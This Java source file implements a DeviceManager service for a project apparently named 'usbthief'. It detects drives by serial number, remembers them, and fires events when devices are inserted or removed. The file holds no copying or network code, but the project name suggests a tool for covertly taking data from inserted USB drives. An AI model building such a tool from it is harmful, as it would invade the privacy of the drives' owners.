package com.superredrock.usbthief.core;

import com.superredrock.usbthief.core.config.ConfigManager;
import com.superredrock.usbthief.core.config.ConfigSchema;
import com.superredrock.usbthief.core.event.EventBus;
import com.superredrock.usbthief.core.event.device.DeviceInsertedEvent;
import com.superredrock.usbthief.core.event.device.DeviceRemovedEvent;
import com.superredrock.usbthief.core.event.device.DeviceStateChangedEvent;
import com.superredrock.usbthief.core.event.device.NewDeviceJoinedEvent;

import java.nio.file.*;
import java.util.Collections;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.function.Predicate;
import java.util.logging.Logger;
import java.util.prefs.Preferences;

import static com.superredrock.usbthief.core.DeviceUtils.getHardDiskSN;

public class DeviceManager extends Service {

    private static final String PREF_KEY_KNOWN_SERIALS = "knownDeviceSerials";
    private static final String SERIAL_DELIMITER = "::";

    private final Set<Device> devices = Collections.synchronizedSet(new HashSet<>());
    private final Set<String> knownSerials = ConcurrentHashMap.newKeySet();
    private final ConcurrentHashMap<String, String> knownVolumeNames = new ConcurrentHashMap<>();
    private final FileSystem fileSystem = FileSystems.getDefault();
    private final EventBus eventBus;
    private final Preferences prefs = Preferences.userNodeForPackage(DeviceManager.class);


    protected static final Logger logger = Logger.getLogger(DeviceManager.class.getName());


    public DeviceManager() {
        this(EventBus.getInstance());
    }

    protected DeviceManager(EventBus eventBus) {
        this.eventBus = eventBus;
        loadKnownSerials();
        createGhostDevices();
        initializeExistingDevices();
    }





    @Override
    protected void tick() {
        logger.info("devices update");
        if (!checkInterrupt()) {
            detectNewDevices();
        }
        if (!checkInterrupt()) {
            updateExistingDevices();
        }
    }

    @Override
    protected long getTickIntervalMs() {
        return 2000;
    }

    @Override
    public String getServiceName() {
        return "DeviceManager";
    }

    @Override
    public String getDescription() {
        return "Device detection and monitoring service";
    }

    @Override
    protected void cleanup() {
        devices.clear();
    }

    @Override
    public String getStatus() {
        return String.format("DeviceManager[%s] - Managing devices: %d", state, devices.size());
    }

    private void detectNewDevices() {
        for (Path path : fileSystem.getRootDirectories()) {
            if (checkInterrupt()) {
                break;
            }

            String serial = getHardDiskSN(path.toString());

            if (ConfigManager.getInstance().isDeviceBlacklistedBySerial(serial)) {
                logger.fine("Device blacklisted by serial number, ignoring: " + serial + " (" + path + ")");
                continue;
            }

            Device existing = findDeviceBySerial(serial);

            if (existing != null) {
                if (existing.isGhost()) {
                    existing.merge(path);
                    onDeviceInserted(existing);
                }
            } else {
                Device device = new Device(path);
                devices.add(device);
                addKnownSerial(serial, device.getVolumeName());
                onNewDeviceJoined(device);
            }
        }
    }

    private void updateExistingDevices() {
        synchronized (devices) {
            for (Device device : devices) {
                if (checkInterrupt()) {
                    break;
                }

                Device.DeviceState previousState = device.getState();
                device.update();

                if (device.isChangeAndReset()) {
                    Device.DeviceState newState = device.getState();
                    onDeviceStateChanged(device, previousState, newState);

                    if (newState == Device.DeviceState.OFFLINE) {
                        onDeviceRemoved(device);
                    }
                }
            }
        }
    }

    private boolean checkInterrupt() {
        return Thread.currentThread().isInterrupted();
    }

    private void loadKnownSerials() {
        String stored = prefs.get(PREF_KEY_KNOWN_SERIALS, "");
        if (!stored.isEmpty()) {
            String[] devices = stored.split("\\|\\|");
            for (String device : devices) {
                String[] parts = device.split(SERIAL_DELIMITER, 2);
                if (parts.length >= 1) {
                    String serial = parts[0].trim();
                    if (!serial.isEmpty() && !serial.equals(SERIAL_DELIMITER)) {
                        knownSerials.add(serial);
                        if (parts.length >= 2) {
                            knownVolumeNames.put(serial, parts[1].trim());
                        }
                    }
                }
            }
        }
        logger.info("Loaded " + knownSerials.size() + " known device serials");
    }

    private void saveKnownSerials() {
        String[] devices = knownSerials.stream()
                .map(serial -> {
                    String name = knownVolumeNames.getOrDefault(serial, "");
                    return serial + SERIAL_DELIMITER + name;
                })
                .toArray(String[]::new);
        String stored = String.join("||", devices);
        prefs.put(PREF_KEY_KNOWN_SERIALS, stored);
    }

    private void addKnownSerial(String serial, String volumeName) {
        if (serial != null) {
            serial = serial.trim();
            if (!serial.isEmpty() && !serial.equals(SERIAL_DELIMITER) && knownSerials.add(serial)) {
                if (volumeName != null && !volumeName.trim().isEmpty()) {
                    knownVolumeNames.put(serial, volumeName.trim());
                }
                saveKnownSerials();
            }
        }
    }

    public void clearKnownSerials() {
        prefs.remove(PREF_KEY_KNOWN_SERIALS);
        knownSerials.clear();
        knownVolumeNames.clear();
        logger.info("Cleared all known device serials");
    }

    private void createGhostDevices() {
        for (String serial : knownSerials) {
            String volumeName = knownVolumeNames.get(serial);
            devices.add(new Device(serial, volumeName));
        }
    }

    private void initializeExistingDevices() {
        for (Path path : fileSystem.getRootDirectories()) {
            String serial = getHardDiskSN(path.toString());

            if (ConfigManager.getInstance().isDeviceBlacklistedBySerial(serial)) {
                continue;
            }

            Device ghostDevice = findGhostDevice(serial);

            if (ghostDevice != null) {
                ghostDevice.merge(path);
            } else {
                Device device = new Device(path);
                if (!knownSerials.contains(serial)) {
                    addKnownSerial(serial, device.getVolumeName());
                    onNewDeviceJoined(device);
                }
                devices.add(device);
            }
        }
    }

    private Device findDevice(Predicate<Device> predicate) {
        synchronized (devices) {
            for (Device device : devices) {
                if (predicate.test(device)) {
                    return device;
                }
            }
        }
        return null;
    }

    private Device findGhostDevice(String serial) {
        return findDevice(device -> device.isGhost() && serial.equals(device.getSerialNumber()));
    }

    private Device findDeviceBySerial(String serial) {
        return findDevice(device -> serial.equals(device.getSerialNumber()));
    }

    public Device getDevice(Path path) {
        return findDevice(device -> path.startsWith(device.getRootPath()));
    }

    public Device getDevice(FileStore store) {
        if (store == null) {
            return null;
        }
        return findDevice(device -> {
            FileStore deviceStore = device.getFileStore();
            return store.equals(deviceStore)
                    && device.getState() != Device.DeviceState.OFFLINE;
        });
    }

    public Set<Device> getAllDevices() {
        synchronized (devices) {
            return Set.copyOf(devices);
        }
    }

    public void updateDeviceVolumeName(String serial, String volumeName) {
        if (serial != null && !serial.isEmpty() && knownSerials.contains(serial)) {
            if (volumeName != null && !volumeName.trim().isEmpty()) {
                knownVolumeNames.put(serial, volumeName.trim());
                saveKnownSerials();
                Device device = findDeviceBySerial(serial);
                if (device != null && !device.isGhost()) {
                    device.setVolumeName(volumeName.trim());
                }
            }
        }
    }

    protected void onDeviceInserted(Device device) {
        logger.info("Device inserted: " + device);
        eventBus.dispatch(new DeviceInsertedEvent(device));
    }

    protected void onDeviceRemoved(Device device) {
        logger.info("Device removed: " + device);
        eventBus.dispatch(new DeviceRemovedEvent(device));
    }

    protected void onDeviceStateChanged(Device device, Device.DeviceState oldState, Device.DeviceState newState) {
        logger.fine(String.format("Device state changed: %s %s -> %s", device, oldState, newState));
        eventBus.dispatch(new DeviceStateChangedEvent(device, oldState, newState));
    }

    protected void onNewDeviceJoined(Device device) {
        logger.info("New device joined (first time): " + device.getSerialNumber());
        eventBus.dispatch(new NewDeviceJoinedEvent(device));
    }

    public boolean removeDeviceCompletely(String serial) {
        if (serial == null || serial.isEmpty()) {
            return false;
        }

        Device deviceToRemove = null;
        synchronized (devices) {
            for (Device device : devices) {
                if (serial.equals(device.getSerialNumber())) {
                    deviceToRemove = device;
                    break;
                }
            }

            if (deviceToRemove != null) {
                devices.remove(deviceToRemove);
            }
        }

        if (deviceToRemove != null) {
            knownSerials.remove(serial);
            knownVolumeNames.remove(serial);
            saveKnownSerials();
            logger.info("Device completely removed: " + serial);
            return true;
        }

        return false;
    }
}
